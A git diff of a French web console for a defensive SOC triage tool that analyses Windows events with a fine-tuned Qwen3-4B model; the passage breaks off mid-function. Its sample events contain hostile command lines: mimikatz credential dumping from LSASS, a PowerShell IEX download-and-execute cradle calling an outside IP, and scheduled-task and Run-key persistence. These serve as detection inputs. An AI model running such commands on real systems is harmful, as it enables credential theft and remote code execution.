-    <section class="card engine">
-      <div class="hd"><h2>Moteur d'inférence</h2></div>
-      <div class="bd">
-        <div class="seg">
-          <button id="m-browser" class="on">Navigateur</button>
-          <button id="m-colab">Serveur Colab</button>
-        </div>
-        <div class="mode on" id="p-browser">
-          <div class="small muted">Le modèle (Qwen3-4B fine-tuné, GGUF Q4_K_M, ~2,5 Go) s'exécute <b style="color:#cbd5e1">entièrement dans votre navigateur</b> : aucune donnée ne quitte votre poste.</div>
-          <div class="bar"><i id="dl-bar"></i></div>
-          <div class="small muted" id="dl-txt">Non chargé</div>
-          <button class="btn primary block" id="btn-load" style="margin-top:10px">Charger le modèle</button>
-          <ul class="feat">
-            <li>Téléchargé une seule fois, puis mis en cache</li>
-            <li id="gpu-info">Détection de WebGPU…</li>
-            <li>Compter 1 à 3 min par analyse sur CPU</li>
-          </ul>
-        </div>
-        <div class="mode" id="p-colab">
-          <div class="small muted">Rapide (GPU T4). Lancez la démo Colab, puis collez l'adresse <span class="tag">https://….gradio.live</span> affichée en bas du notebook.</div>
-          <a class="btn block" style="margin:12px 0 10px" target="_blank" rel="noopener" href="https://colab.research.google.com/github/azddine123/soc-qwen-fr/blob/main/notebooks/demo_colab.ipynb">1. Ouvrir la démo Colab ↗</a>
-          <input type="text" id="colab-url" placeholder="https://xxxxxxxx.gradio.live">
-          <button class="btn primary block" id="btn-colab" style="margin-top:10px">2. Connecter</button>
-          <div class="note"><b>Astuce :</b> dans Colab, choisissez <i>Exécution → Tout exécuter</i> avec un GPU T4. Le lien reste valable tant que la session est ouverte.</div>
-        </div>
-        <div class="err" id="eng-err"></div>
-        <h3>Performances (test, 123 logs réels)</h3>
-        <table class="mtab small">
-          <tr><td>JSON exploitable</td><td>33 % → <b>94 %</b></td></tr>
-          <tr><td>Verdict correct</td><td>86 % → <b>100 %</b></td></tr>
-          <tr><td>Technique exacte</td><td>18 % → <b>24 %</b></td></tr>
-          <tr><td>Technique parente</td><td>21 % → <b>33 %</b></td></tr>
-          <tr><td>Tactique (ID TA)</td><td>0 % → <b>36 %</b></td></tr>
-        </table>
-        <div class="small muted" style="margin-top:6px">Qwen3-4B de base → SOC-Qwen-FR. La technique proposée doit être vérifiée par l'analyste.</div>
-      </div>
-    </section>
+  <!-- colonne 3 : triage -->
+  <section class="card"><div class="ct"><span>TRIAGE</span><small>05</small></div>
+    <div id="result"><div class="empty">AUCUNE ANALYSE<br>CHARGEZ UN MOTEUR · COLLEZ UN ÉVÉNEMENT · ANALYSEZ</div></div>
+  </section>
+</div>
 
-    <!-- saisie -->
-    <section class="card">
-      <div class="hd"><h2>Événement</h2><div class="spacer"></div>
-        <label class="btn" style="padding:6px 10px">Importer .json<input type="file" id="file" accept=".json,.txt" hidden></label></div>
-      <div class="bd">
-        <textarea id="event" spellcheck="false" placeholder='{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "Image": "...", "CommandLine": "..."}'></textarea>
-        <div class="chips" id="chips"></div>
-        <div class="row">
-          <button class="btn primary" id="btn-run" style="flex:1" disabled>Analyser l'événement</button>
-          <button class="btn" id="btn-fmt" title="Formater le JSON">{ }</button>
-          <button class="btn" id="btn-clear" title="Effacer">✕</button>
-        </div>
-        <div class="err" id="run-err"></div>
-      </div>
-    </section>
-
-    <!-- résultat -->
-    <section class="card">
-      <div class="hd"><h2>Triage</h2><div class="spacer"></div>
-        <button class="btn" id="btn-copy" style="padding:6px 10px" disabled>Copier le JSON</button></div>
-      <div class="bd" id="result">
-        <div class="empty">
-          <svg width="46" height="46" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 3l8 3v6c0 4.5-3.4 8.3-8 9-4.6-.7-8-4.5-8-9V6l8-3z"/><path d="M9 12l2 2 4-4"/></svg>
-          <div>Chargez un moteur, collez un événement Windows puis lancez l'analyse.</div>
-        </div>
-      </div>
-    </section>
-  </div>
-
-  <div class="lower">
-    <section class="card">
-      <div class="hd"><h2>Historique</h2><div class="spacer"></div>
-        <button class="btn" id="btn-csv" style="padding:6px 10px">Export CSV</button>
-        <button class="btn" id="btn-json" style="padding:6px 10px">Export JSON</button>
-        <button class="btn" id="btn-reset" style="padding:6px 10px">Vider</button></div>
-      <div class="bd" style="padding:0 0 6px; overflow:auto">
-        <table>
-          <thead><tr><th>Heure</th><th>Hôte</th><th>Verdict</th><th>Technique</th><th>Tactique</th><th>Sévérité</th></tr></thead>
-          <tbody id="hist"><tr><td colspan="6" class="muted" style="text-align:center; padding:24px">Aucune analyse pour le moment</td></tr></tbody>
-        </table>
-      </div>
-    </section>
-    <section class="card">
-      <div class="hd"><h2>Répartition par tactique</h2></div>
-      <div class="bd hbars" id="tacbars"><div class="muted small">Les tactiques détectées apparaîtront ici.</div></div>
-    </section>
-  </div>
+<div class="lower">
+  <section class="card wide"><div class="ct"><span>HISTORIQUE</span><small>06</small></div>
+    <div class="btns" style="margin-bottom:.6rem"><button class="btn" id="btn-csv">EXPORT CSV</button><button class="btn" id="btn-json">EXPORT JSON</button><button class="btn" id="btn-reset">VIDER</button></div>
+    <div style="overflow:auto;max-height:28rem"><table>
+      <thead><tr><th>HEURE</th><th>HÔTE</th><th>VERDICT</th><th>TECHNIQUE</th><th>TACTIQUE</th><th>SÉVÉRITÉ</th></tr></thead>
+      <tbody id="hist"></tbody></table></div>
+  </section>
+  <section class="card"><div class="ct"><span>TACTIQUES</span><small>07</small></div>
+    <div id="tacbars"></div>
+    <div class="tri tiny"><div>ALERTES<b id="k-total">0</b></div><div>SUSPECTES<b id="k-sus">0</b></div><div>TECHNIQUES<b id="k-tech">0</b></div></div>
+  </section>
+  <section class="card wide"><div class="ct"><span>JOURNAL D'ANALYSE</span><small>08</small></div>
+    <div class="row"><span>SÉVÉRITÉ DES DERNIÈRES ALERTES</span><span>TEMPS MOYEN <b id="k-time">—</b></span></div>
+    <canvas id="chart"></canvas>
+    <div class="lg"><button id="play" aria-label="Rejouer le journal"><svg viewBox="0 0 12 12"><path id="pi" d="M3 1l8 5-8 5z"/></svg></button>
+      <div><div class="row"><span>PREMIÈRE</span><span id="msg">EN ATTENTE D'UN ÉVÉNEMENT</span><span>DERNIÈRE</span></div>
+        <div id="rail"><div class="b"></div></div>
+        <div class="row"><span id="tc">0 / 0</span><span id="k-high">0 CRITIQUES / ÉLEVÉES</span></div></div></div>
+  </section>
+  <section class="card"><div class="ct"><span>À PROPOS</span><small>09</small></div>
+    <div class="note">Qwen3-4B-Instruct fine-tuné en QLoRA sur 6 002 exemples tirés des règles <b>SigmaHQ</b> et de <b>MITRE ATT&amp;CK v19</b>. Outil d'aide à l'analyste : la technique proposée doit être vérifiée.</div>
+    <div class="btns" style="margin-top:.9rem">
+      <a class="btn" href="https://github.com/azddine123/soc-qwen-fr" target="_blank" rel="noopener">GITHUB ↗</a>
+      <a class="btn" href="https://huggingface.co/AZAS123/soc-qwen3-4b-fr-lora" target="_blank" rel="noopener">MODÈLE ↗</a>
+      <a class="btn" href="https://huggingface.co/datasets/AZAS123/soc-triage-fr" target="_blank" rel="noopener">DATASET ↗</a>
+    </div>
+  </section>
+</div>
 </main>
 
-<footer><div class="wrap">SOC-Qwen-FR — Qwen3-4B-Instruct fine-tuné (QLoRA) sur des règles SigmaHQ (DRL 1.1) et MITRE ATT&amp;CK v19. Outil d'aide à l'analyste, usage défensif uniquement.
-  Moteur navigateur : <a href="https://github.com/ngxson/wllama" target="_blank" rel="noopener">wllama</a> (llama.cpp WebAssembly). Réalisé par Azddine EL HAMDAOUI.</div></footer>
+<footer class="bot"><span>CONSOLE SOC &nbsp;·&nbsp; QWEN3-4B QLORA &nbsp;·&nbsp; 15 TACTIQUES &nbsp;·&nbsp; 2 MOTEURS &nbsp;·&nbsp; USAGE DÉFENSIF</span><span>AZDDINE EL HAMDAOUI &nbsp;·&nbsp; ENSA BÉNI MELLAL <b>//////</b></span></footer>
+</div>
 <div class="toast" id="toast"></div>
 
 <script type="module">
 const MODEL_REPO = "AZAS123/soc-qwen3-4b-fr-GGUF";
 const SYSTEM_PROMPT = "Tu es un analyste SOC expert en détection sur Windows. Analyse l'événement fourni et réponds UNIQUEMENT avec un objet JSON contenant : verdict (\"suspect\" ou \"bénin\"), technique_id, technique, tactique, severite, explication (en français) et recommandations (liste, en français).";
-const TACTICS = [
-  ["TA0043","Reconnaissance"],["TA0042","Dév. de ressources"],["TA0001","Accès initial"],["TA0002","Exécution"],
-  ["TA0003","Persistance"],["TA0004","Élévation de privilèges"],["TA0005","Furtivité"],["TA0112","Affaiblissement des défenses"],
-  ["TA0006","Accès aux identifiants"],["TA0007","Découverte"],["TA0008","Mouvement latéral"],["TA0009","Collecte"],
-  ["TA0011","Commande et contrôle"],["TA0010","Exfiltration"],["TA0040","Impact"]];
-const SEV = { "informative":[1,"var(--info)"], "faible":[2,"var(--low)"], "moyenne":[3,"var(--med)"], "élevée":[4,"var(--high)"], "elevee":[4,"var(--high)"], "critique":[5,"var(--crit)"] };
+const TACTICS = [["TA0043","Reconnaissance"],["TA0042","Dév. de ressources"],["TA0001","Accès initial"],["TA0002","Exécution"],["TA0003","Persistance"],
+  ["TA0004","Élévation de privilèges"],["TA0005","Furtivité"],["TA0112","Affaiblissement des défenses"],["TA0006","Accès aux identifiants"],["TA0007","Découverte"],
+  ["TA0008","Mouvement latéral"],["TA0009","Collecte"],["TA0011","Commande et contrôle"],["TA0010","Exfiltration"],["TA0040","Impact"]];
+const SEV = {"informative":[1,"var(--info)"],"faible":[2,"var(--low)"],"moyenne":[3,"var(--med)"],"élevée":[4,"var(--high)"],"elevee":[4,"var(--high)"],"critique":[5,"var(--crit)"]};
+const SEVHEX = ["#9dbcbc","#9dbcbc","#0f9d8a","#e3a21a","#ff5a3c","#e5372a"];
 const EXAMPLES = [
-  ["Mimikatz", {"Channel":"Microsoft-Windows-Sysmon/Operational","EventID":1,"Computer":"WS-014.corp.local","Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"\"cmd.exe\" /c C:\\Tools\\x64\\mimikatz.exe \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit","User":"CORP\\j.dupont","IntegrityLevel":"High","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}],
-  ["Tâche planifiée", {"Channel":"Microsoft-Windows-Sysmon/Operational","EventID":1,"Computer":"WS-031.corp.local","Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks /create /tn Updater /tr C:\\Users\\Public\\upd.exe /sc onlogon /ru SYSTEM","User":"CORP\\j.dupont","ParentImage":"C:\\Windows\\System32\\cmd.exe"}],
-  ["Téléchargement PowerShell", {"Channel":"Microsoft-Windows-PowerShell/Operational","EventID":4104,"Computer":"WS-007.corp.local","ScriptBlockText":"IEX (New-Object Net.WebClient).DownloadString('http://185.12.45.9/a.ps1')"}],
-  ["Clé Run (registre)", {"Channel":"Microsoft-Windows-Sysmon/Operational","EventID":13,"Computer":"WS-022.corp.local","EventType":"SetValue","Image":"C:\\Users\\k.amrani\\AppData\\Local\\Temp\\svc.exe","TargetObject":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater","Details":"C:\\Users\\k.amrani\\AppData\\Local\\Temp\\svc.exe"}],
-  ["Requête DNS légitime", {"Channel":"Microsoft-Windows-Sysmon/Operational","EventID":22,"Computer":"WS-026.corp.local","Image":"C:\\Program Files\\Mozilla Firefox\\firefox.exe","QueryName":"www.ensabm.ac.ma"}],
+  ["MIMIKATZ", {"Channel":"Microsoft-Windows-Sysmon/Operational","EventID":1,"Computer":"WS-014.corp.local","Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"\"cmd.exe\" /c C:\\Tools\\x64\\mimikatz.exe \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit","User":"CORP\\j.dupont","IntegrityLevel":"High","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}],
+  ["TÂCHE PLANIFIÉE", {"Channel":"Microsoft-Windows-Sysmon/Operational","EventID":1,"Computer":"WS-031.corp.local","Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks /create /tn Updater /tr C:\\Users\\Public\\upd.exe /sc onlogon /ru SYSTEM","User":"CORP\\j.dupont","ParentImage":"C:\\Windows\\System32\\cmd.exe"}],
+  ["POWERSHELL IEX", {"Channel":"Microsoft-Windows-PowerShell/Operational","EventID":4104,"Computer":"WS-007.corp.local","ScriptBlockText":"IEX (New-Object Net.WebClient).DownloadString('http://185.12.45.9/a.ps1')"}],
+  ["CLÉ RUN", {"Channel":"Microsoft-Windows-Sysmon/Operational","EventID":13,"Computer":"WS-022.corp.local","EventType":"SetValue","Image":"C:\\Users\\k.amrani\\AppData\\Local\\Temp\\svc.exe","TargetObject":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater","Details":"C:\\Users\\k.amrani\\AppData\\Local\\Temp\\svc.exe"}],
+  ["DNS LÉGITIME", {"Channel":"Microsoft-Windows-Sysmon/Operational","EventID":22,"Computer":"WS-026.corp.local","Image":"C:\\Program Files\\Mozilla Firefox\\firefox.exe","QueryName":"www.ensabm.ac.ma"}],
 ];
+const STAGES = [["PARSING","LECTURE DU JSON · CANAL · EVENTID","PRÊT"],["INFÉRENCE","QWEN3-4B · QLORA FR","EN ATTENTE"],["VALIDATION JSON","7 CHAMPS ATTENDUS","EN ATTENTE"],
+  ["MAPPING ATT&CK","TECHNIQUE · TACTIQUE V19","EN ATTENTE"],["RECOMMANDATIONS","ACTIONS ANALYSTE","EN ATTENTE"]];
 
-const $ = (id) => document.getElementById(id);
-const esc = (s) => String(s ?? "").replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
-const toast = (m) => { const t = $("toast"); t.textContent = m; t.classList.add("on"); setTimeout(() => t.classList.remove("on"), 2200); };
-const store = { get(k, d) { try { return JSON.parse(localStorage.getItem(k)) ?? d; } catch { return d; } },
-                set(k, v) { try { localStorage.setItem(k, JSON.stringify(v)); } catch {} } };
+const $ = id => document.getElementById(id);
+const esc = s => String(s ?? "").replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
+const toast = m => { const t = $("toast"); t.textContent = m; t.classList.add("on"); setTimeout(() => t.classList.remove("on"), 2200); };
+const store = { get(k, d) { try { return JSON.parse(localStorage.getItem(k)) ?? d; } catch { return d; } }, set(k, v) { try { localStorage.setItem(k, JSON.stringify(v)); } catch {} } };
+const sevInfo = s => SEV[String(s || "").toLowerCase()] || [0, "var(--info)"];
+const isBen = t => String(t.verdict || "").toLowerCase().startsWith("b");
 
-let engine = null;          // { name, run(text, onToken) }
-let history = store.get("socqwen.history", []);
-let current = null;
+let engine = null, history = store.get("socqwen.history", []), current = null, wllama = null;
+const t0 = Date.now();
+
+/* ---------- statique ---------- */
+for (let i = 0; i < 50; i++) $("loadbar").append(document.createElement("i"));
+for (let i = 0; i < 30; i++) $("dlbar").append(document.createElement("i"));
+const subEls = STAGES.map((s, i) => { const d = document.createElement("div"); d.className = "sub";
+  d.innerHTML = `<span class="n">0${i + 1}</span><span>${s[0]}<i>${s[1]}</i></span><span class="ctag idle">${s[2]}</span>`; $("subs").append(d); return { d, tag: d.querySelector(".ctag") }; });
+function stage(i, txt, kind) { const e = subEls[i]; e.tag.textContent = txt; e.tag.className = "ctag" + (kind === "hot" ? " hot" : kind === "idle" ? " idle" : ""); e.d.classList.toggle("on", kind === "hot"); }
+function resetStages() { STAGES.forEach((s, i) => stage(i, i ? "EN ATTENTE" : (engine ? "PRÊT" : "EN ATTENTE"), "idle")); }
+resetStages();
+setInterval(() => { const s = Math.floor((Date.now() - t0) / 1000); $("rt").textContent = [s / 3600, s / 60 % 60, s % 60].map(v => String(Math.floor(v)).padStart(2, "0")).join(":"); }, 1000);
 
 function setStatus(state, text) { $("sdot").className = "dot " + state; $("stxt").textContent = text; }
-function setEngine(e) { engine = e; $("btn-run").disabled = !e; setStatus(e ? "ready" : "", e ? e.name + " prêt" : "Aucun moteur connecté"); }
+function setEngine(e) { engine = e; $("btn-run").disabled = !e; $("m-eng").textContent = e ? e.name : "—"; setStatus(e ? "ok" : "", e ? "EN LIGNE" : "HORS LIGNE"); resetStages(); }
 
-/* ---------- modes ---------- */
-for (const [b, p] of [["m-browser","p-browser"],["m-colab","p-colab"]]) {
-  $(b).onclick = () => { document.querySelectorAll(".seg button").forEach(x => x.classList.remove("on"));
-    document.querySelectorAll(".mode").forEach(x => x.classList.remove("on")); $(b).classList.add("on"); $(p).classList.add("on"); };
-}
-$("gpu-info").textContent = navigator.gpu ? "WebGPU détecté : accélération GPU possible" : "WebGPU indisponible : exécution sur CPU";
+/* ---------- moteurs ---------- */
+for (const [b, p] of [["m-browser","p-browser"],["m-colab","p-colab"]]) $(b).onclick = () => {
+  document.querySelectorAll(".seg .btn").forEach(x => x.classList.remove("on")); document.querySelectorAll(".mode").forEach(x => x.classList.remove("on"));
+  $(b).classList.add("on"); $(p).classList.add("on"); };
+$("gpu").textContent = navigator.gpu ? "WEBGPU" : "CPU";
+$("thr").textContent = (window.crossOriginIsolated ? navigator.hardwareConcurrency || "—" : 1);
 const savedUrl = store.get("socqwen.colab", ""); if (savedUrl) $("colab-url").value = savedUrl;
+function dl(p, txt) { [...$("dlbar").children].forEach((c, i) => c.style.background = i / 30 < p ? (i > 22 ? "var(--coral)" : i > 12 ? "var(--teal)" : "var(--ink)") : ""); $("dl-pct").textContent = Math.round(p * 100) + "%"; if (txt) $("dl-txt").textContent = txt; }
 
-/* ---------- moteur navigateur (wllama) ---------- */
-let wllama = null;
 $("btn-load").onclick = async () => {
-  $("eng-err").textContent = ""; $("btn-load").disabled = true; setStatus("busy", "Chargement du modèle…");
+  $("eng-err").textContent = ""; $("btn-load").disabled = true; setStatus("busy", "CHARGEMENT");
   try {
     const meta = await (await fetch(`https://huggingface.co/api/models/${MODEL_REPO}`)).json();
-    const files = (meta.siblings || []).map(s => s.rfilename);
-    const first = files.find(f => /-00001-of-\d+\.gguf$/.test(f));
-    if (!first) throw new Error("La version découpée du modèle pour le navigateur n'est pas encore publiée. Utilisez le serveur Colab.");
+    const first = (meta.siblings || []).map(s => s.rfilename).find(f => /-00001-of-\d+\.gguf$/.test(f));
+    if (!first) throw new Error("La version du modèle pour le navigateur n'est pas encore publiée : utilisez le serveur Colab.");
     const { Wllama, LoggerWithoutDebug } = await import("./vendor/wllama/index.js");
-    wllama = new Wllama({ default: new URL("./vendor/wllama/wllama.wasm", location.href).href },
-                        { parallelDownloads: 4, logger: LoggerWithoutDebug });
-    await wllama.loadModelFromHF({ repo: MODEL_REPO, file: first }, {
-      n_ctx: 2048, n_batch: 512,
-      progressCallback: ({ loaded, total }) => {
-        const p = total ? loaded / total : 0;
-        $("dl-bar").style.width = (p * 100).toFixed(1) + "%";
-        $("dl-txt").textContent = `Téléchargement : ${(loaded / 1e9).toFixed(2)} / ${(total / 1e9).toFixed(2)} Go`;
-      } });
-    $("dl-bar").style.width = "100%";
-    const mt = wllama.isMultithread ? (wllama.isMultithread() ? "multi-thread" : "mono-thread") : "";
-    $("dl-txt").textContent = `Modèle chargé ${mt ? "(" + mt + ")" : ""}`;
-    setEngine({ name: "Navigateur", run: async (text, onTok) => {
+    wllama = new Wllama({ default: new URL("./vendor/wllama/wllama.wasm", location.href).href }, { parallelDownloads: 4, logger: LoggerWithoutDebug });
+    await wllama.loadModelFromHF({ repo: MODEL_REPO, file: first }, { n_ctx: 2048, n_batch: 512,
+      progressCallback: ({ loaded, total }) => dl(total ? loaded / total : 0, `${(loaded / 1e9).toFixed(2)} / ${(total / 1e9).toFixed(2)} GO`) });
+    dl(1, "MODÈLE CHARGÉ" + (wllama.isMultithread?.() ? " · MULTI-THREAD" : ""));
+    $("btn-load").textContent = "MODÈLE CHARGÉ ✓";
+    setEngine({ name: "NAVIGATEUR", run: async (text, onTok) => {
       const stream = await wllama.createChatCompletion({ messages: buildMessages(text), max_tokens: 512, temperature: 0, stream: true });
-      let out = ""; for await (const ch of stream) { const d = ch.choices?.[0]?.delta?.content || ""; out += d; onTok(out); }
-      return out; } });
-    $("btn-load").textContent = "Modèle chargé ✓";
-  } catch (e) {
-    console.error(e); $("eng-err").textContent = e.message || String(e); $("btn-load").disabled = false; setStatus("err", "Échec du chargement");
-  }
+      let out = ""; for await (const ch of stream) { out += ch.choices?.[0]?.delta?.content || ""; onTok(out); } return out; } });
+  } catch (e) { console.error(e); $("eng-err").textContent = e.message || String(e); $("btn-load").disabled = false; setStatus("hot", "ÉCHEC"); }
 };
-
-/* ---------- moteur Colab (Gradio) ---------- */
 $("btn-colab").onclick = async () => {
-  const url = $("colab-url").value.trim().replace(/\/+$/, "");
-  $("eng-err").textContent = "";
-  if (!/^https:\/\/[\w.-]+\.gradio\.live$/.test(url) && !/^https:\/\//.test(url)) { $("eng-err").textContent = "Adresse invalide (attendu : https://….gradio.live)"; return; }
-  setStatus("busy", "Connexion au serveur Colab…"); $("btn-colab").disabled = true;
+  const url = $("colab-url").value.trim().replace(/\/+$/, ""); $("eng-err").textContent = "";
+  if (!/^https:\/\//.test(url)) { $("eng-err").textContent = "ADRESSE INVALIDE (ATTENDU : HTTPS://….GRADIO.LIVE)"; return; }
+  setStatus("busy", "CONNEXION"); $("btn-colab").disabled = true;
   try {
     const { Client } = await import("https://esm.sh/@gradio/client@2.8.0");
-    const client = await Client.connect(url);
-    store.set("socqwen.colab", url);
-    setEngine({ name: "Serveur Colab", run: async (text) => {
-      let r; try { r = await client.predict("/triage", { event_text: text }); }
-      catch (e) { r = await client.predict("/triage", [text]); }
+    const client = await Client.connect(url); store.set("socqwen.colab", url);
+    setEngine({ name: "COLAB · T4", run: async text => { let r;
+      try { r = await client.predict("/triage", { event_text: text }); } catch { r = await client.predict("/triage", [text]); }
       return Array.isArray(r.data) ? r.data[0] : r.data; } });
-  } catch (e) {
-    console.error(e); $("eng-err").textContent = "Connexion impossible : la session Colab est-elle lancée ? (" + (e.message || e) + ")"; setStatus("err", "Serveur injoignable");
-  } finally { $("btn-colab").disabled = false; }
+  } catch (e) { console.error(e); $("eng-err").textContent = "CONNEXION IMPOSSIBLE : LA SESSION COLAB EST-ELLE LANCÉE ?"; setStatus("hot", "INJOIGNABLE"); }
+  finally { $("btn-colab").disabled = false; }
 };
 
 /* ---------- saisie ---------- */
-for (const [label, ev] of EXAMPLES) {
-  const b = document.createElement("button"); b.className = "chip"; b.textContent = label;
-  b.onclick = () => { $("event").value = JSON.stringify(ev, null, 2); $("run-err").textContent = ""; }; $("chips").appendChild(b);
-}
-$("btn-fmt").onclick = () => { try { $("event").value = JSON.stringify(JSON.parse($("event").value), null, 2); } catch { $("run-err").textContent = "JSON invalide"; } };
+for (const [label, ev] of EXAMPLES) { const b = document.createElement("button"); b.className = "btn"; b.textContent = label;
+  b.onclick = () => { $("event").value = JSON.stringify(ev, null, 2); $("run-err").textContent = ""; }; $("chips").append(b); }
+$("btn-fmt").onclick = () => { try { $("event").value = JSON.stringify(JSON.parse($("event").value), null, 2); } catch { $("run-err").textContent = "JSON INVALIDE"; } };
 $("btn-clear").onclick = () => { $("event").value = ""; $("run-err").textContent = ""; };
-$("file").onchange = async (e) => { const f = e.target.files[0]; if (f) $("event").value = await f.text(); e.target.value = ""; };
+$("file").onchange = async e => { const f = e.target.files[0]; if (f) $("event").value = await f.text(); e.target.value = ""; };
 
-function buildMessages(text) {
-  let t = text.trim(); try { t = JSON.stringify(JSON.parse(t)); } catch {}
-  return [{ role: "system", content: SYSTEM_PROMPT },
-          { role: "user", content: "Analyse cet événement Windows :\n```json\n" + t.slice(0, 6000) + "\n```" }];
-}
-function parseTriage(raw) {
-  if (raw && typeof raw === "object") return raw;
-  const s = String(raw || "").replace(/<think>[\s\S]*?<\/think>/g, "");
-  try { return JSON.parse(s.slice(s.indexOf("{"), s.lastIndexOf("}") + 1)); } catch { return { brut: s }; }
-}
+function buildMessages(text) { let t = text.trim(); try { t = JSON.stringify(JSON.parse(t)); } catch {}
+  return [{ role: "system", content: SYSTEM_PROMPT }, { role: "user", content: "Analyse cet événement Windows :\n```json\n" + t.slice(0, 6000) + "\n```" }]; }
+function parseTriage(raw) { if (raw && typeof raw === "object") return raw; const s = String(raw || "").replace(/<think>[\s\S]*?<\/think>/g, "");
+  try { return JSON.parse(s.slice(s.indexOf("{"), s.lastIndexOf("}") + 1)); } catch { return { brut: s }; } }
 
 $("btn-run").onclick = async () => {
-  const text = $("event").value.trim();
-  $("run-err").textContent = "";
-  if (!text) { $("run-err").textContent = "Collez d'abord un événement."; return; }
-  let host = ""; try { const o = JSON.parse(text); host = o.Computer || o.Hostname || ""; } catch {}
-  $("btn-run").disabled = true; $("btn-run").textContent = "Analyse en cours…"; setStatus("busy", "Analyse en cours…");
-  $("result").innerHTML = `<div class="small muted" style="margin-bottom:8px">Génération par le modèle…</div><div class="stream" id="stream">…</div>`;
-  const t0 = performance.now();
+  const text = $("event").value.trim(); $("run-err").textContent = "";
+  if (!text) { $("run-err").textContent = "COLLEZ D'ABORD UN ÉVÉNEMENT"; return; }
+  let host = "", ch = "", eid = "";
+  try { const o = JSON.parse(text); host = o.Computer || o.Hostname || ""; ch = o.Channel || ""; eid = o.EventID ?? ""; stage(0, "OK", "ok"); }
+  catch { stage(0, "TEXTE BRUT", "idle"); }
+  $("iso").textContent = "ÉVÉNEMENT · " + (eid !== "" ? "EVENTID " + eid : "TEXTE") + (host ? " · " + host.toUpperCase() : "");
+  $("btn-run").disabled = true; $("btn-run").textContent = "ANALYSE EN COURS…"; setStatus("busy", "ANALYSE");
+  stage(1, "EN COURS", "hot"); [2, 3, 4].forEach(i => stage(i, "EN ATTENTE", "idle"));
+  $("result").innerHTML = `<div class="tiny" style="margin-bottom:.6rem">GÉNÉRATION PAR LE MODÈLE…</div><div class="stream" id="stream">…</div>`;
+  const start = performance.now();
   try {
-    const raw = await engine.run(text, (partial) => { const el = $("stream"); if (el) { el.textContent = partial; el.scrollTop = el.scrollHeight; } });
-    const tri = parseTriage(raw); const secs = (performance.now() - t0) / 1000;
+    const raw = await engine.run(text, p => { const el = $("stream"); if (el) { el.textContent = p; el.scrollTop = el.scrollHeight; } });
+    stage(1, "OK", "ok");
+    const tri = parseTriage(raw), secs = (performance.now() - start) / 1000;
+    if (tri.brut !== undefined) { stage(2, "ÉCHEC", "hot"); }
+    else { stage(2, "OK", "ok"); stage(3, isBen(tri) ? "N/A" : (tri.technique_id || "—"), isBen(tri) ? "idle" : "ok"); stage(4, (tri.recommandations || []).length + " ACTIONS", "ok"); }
     current = { ts: new Date().toISOString(), host, engine: engine.name, secs, event: text, triage: tri };
-    if (!tri.brut) { history.unshift(current); history = history.slice(0, 200); store.set("socqwen.history", history); }
+    if (tri.brut === undefined) { history.unshift(current); history = history.slice(0, 200); store.set("socqwen.history", history); }
     render(current); refresh();
-  } catch (e) {
-    console.error(e); $("result").innerHTML = `<p class="err">Erreur pendant l'analyse : ${esc(e.message || e)}</p>`;
-  } finally { $("btn-run").disabled = false; $("btn-run").textContent = "Analyser l'événement"; setStatus("ready", engine.name + " prêt"); }
+  } catch (e) { console.error(e); stage(1, "ERREUR", "hot"); $("result").innerHTML = `<p class="err">ERREUR PENDANT L'ANALYSE : ${esc(e.message || e)}</p>`; }
+  finally { $("btn-run").disabled = false; $("btn-run").textContent = "ANALYSER L'ÉVÉNEMENT"; setStatus("ok", "EN LIGNE"); }
 };
 
 /* ---------- rendu ---------- */
-function attackUrl(id) { return "https://attack.mitre.org/techniques/" + String(id).replace(".", "/") + "/"; }
-function sevInfo(s) { return SEV[String(s || "").toLowerCase()] || [0, "var(--info)"]; }
+const attackUrl = id => "https://attack.mitre.org/techniques/" + String(id).replace(".", "/") + "/";
 function render(rec) {
-  const t = rec.triage; $("btn-copy").disabled = false;
-  if (t.brut !== undefined) { $("result").innerHTML = `<p class="err">Réponse non structurée :</p><pre>${esc(t.brut)}</pre>`; return; }
-  const benin = String(t.verdict || "").toLowerCase().startsWith("b");
-  const [lvl, col] = sevInfo(t.severite);
-  const ta = (String(t.tactique || "").match(/TA\d{4}/) || [""])[0];
-  let h = `<div class="verdict ${benin ? "ben" : "sus"}"><div class="vicon">${benin ? "✓" : "!"}</div>
-    <div class="vtxt"><b>${benin ? "BÉNIN" : "SUSPECT"}</b><div>${esc(rec.host || "Hôte inconnu")} · ${new Date(rec.ts).toLocaleString("fr-FR")}</div></div>
-    <div class="sev"><div class="small muted">Sévérité</div><b style="color:${col}">${esc(t.severite || "—")}</b>
-    <div class="meter">${[1,2,3,4,5].map(i => `<i style="${i <= lvl ? "background:" + col : ""}"></i>`).join("")}</div></div></div>`;
-  if (!benin) {
-    h += `<div class="tech"><div><div class="lbl">Technique MITRE ATT&amp;CK</div>
-      ${t.technique_id ? `<a class="id" href="${attackUrl(t.technique_id)}" target="_blank" rel="noopener">${esc(t.technique_id)} ↗</a>` : ""}
-      <div class="name">${esc(t.technique || "—")}</div></div>
-      <div style="text-align:right"><div class="lbl">Tactique</div><div style="margin-top:6px; font-weight:600">${esc(t.tactique || "—")}</div></div></div>
-      <div class="chainlbl"><span>Reconnaissance</span><span>Chaîne d'attaque</span><span>Impact</span></div>
-      <div class="chain">${TACTICS.map(([id, n]) => `<div class="${id === ta ? "on" : ""}" data-t="${id} · ${n}"></div>`).join("")}</div>`;
-  }
-  h += `<h3>Analyse</h3><div class="expl">${esc(t.explication || "")}</div>`;
+  const t = rec.triage;
